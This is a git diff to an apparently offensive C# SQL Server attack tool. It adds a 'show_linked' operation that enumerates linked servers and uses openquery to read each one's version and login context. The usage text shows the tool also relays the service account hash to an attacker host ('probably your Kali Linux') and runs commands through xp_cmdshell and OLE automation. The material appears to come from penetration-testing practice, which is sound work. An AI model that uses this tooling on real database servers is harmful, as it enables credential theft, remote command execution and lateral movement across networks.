@@ -1,4 +1,6 @@
 ﻿using System;
+using System.Collections;
+using System.Collections.Generic;
 using System.Data.SqlClient;
 using System.Runtime.Remoting.Messaging;
 
@@ -6,6 +8,78 @@ namespace SQL
 {
     class Program
     {
+
+        static void enum_linked_servers(SqlConnection con, out List<string> servers)
+        {
+            servers = new List<string>();
+
+            String execCmd = "EXEC sp_linkedservers;";
+
+            SqlCommand command = new SqlCommand(execCmd, con);
+            SqlDataReader reader = command.ExecuteReader();
+
+            while (reader.Read())
+            {
+                Console.WriteLine("Linked SQL server: " + reader[0]);
+                servers.Add(reader[0].ToString());
+            }
+            reader.Close();
+            // find server versions
+            foreach (string server in servers)
+            {
+                try
+                {
+                    execCmd = $"select version from openquery(\"{server}\", 'select @@version as version');";
+                    command = new SqlCommand(execCmd, con);
+                    reader = command.ExecuteReader();
+                    while (reader.Read())
+                    {
+                        Console.WriteLine($"{server} version is: \n " + reader[0]);
+                    }
+                    reader.Close();
+                }
+                catch (SqlException ex)
+                {
+                    if (ex.Number == 7411)
+                    {
+                        Console.WriteLine($"Server {server} is not configured for DATA ACCESS.");
+                    }
+                    else
+                    {
+                        Console.WriteLine("Unhandled exception occured");
+                    }
+                }
+            }
+
+            // find user context
+            foreach (string server in servers)
+            {
+                try
+                {
+                    execCmd = $"select version from openquery(\"{server}\", 'select system_user as version');";
+                    command = new SqlCommand(execCmd, con);
+                    reader = command.ExecuteReader();
+                    while (reader.Read())
+                    {
+                        Console.WriteLine($" On {server} you are executing commands as " + reader[0]);
+                    }
+                    reader.Close();
+                }
+                catch (SqlException ex)
+                {
+                    if (ex.Number == 7411)
+                    {
+                        Console.WriteLine($"Server {server} is not configured for DATA ACCESS.");
+                    }
+                    else
+                    {
+                        Console.WriteLine("Unhandled exception occured");
+                    }
+                }
+            }
+
+        }
+
         static bool check_xp_cmdshell(SqlConnection con)
         {
             try
@@ -196,10 +270,11 @@ namespace SQL
             Console.WriteLine("Arguments:");
             Console.WriteLine("  <sqlServer>    SQL Server name (required)");
             Console.WriteLine("  <dbName>       Database name (required)");
-            Console.WriteLine("  <operation>    Operation (required). Supported: 'enum', 'gethash', 'cmd'");
+            Console.WriteLine("  <operation>    Operation (required). Supported: 'enum', 'gethash', 'xp_cmd', 'ole_cmd', 'show_linked'");
             Console.WriteLine("  gethash <hashServer>   Server to send svc hash (probably your Kali Linux'");
             Console.WriteLine("  xp_cmd <command>   Command to be executed using xp_cmdshell");
             Console.WriteLine("  ole_cmd <command>   Command to be executed using OLE");
+            Console.WriteLine("  show_linked");
         }
 
 
@@ -298,8 +373,12 @@ namespace SQL
                     }
                     con.Close();
                     break;
+                case "show_linked":
+                    List<string> linked_serverst;
+                    enum_linked_servers(con, out linked_serverst);
+                    break;
                 default:
-                    Console.WriteLine($"Error: Invalid operation '{operation}'. Supported: 'enum', 'gethash', 'cmd'");
+                    Console.WriteLine($"Error: Invalid operation '{operation}'. Supported: 'enum', 'gethash', 'xp_cmd', 'ole_cmd', 'show_linked'");
                     DisplayUsage();
                     break;
             }
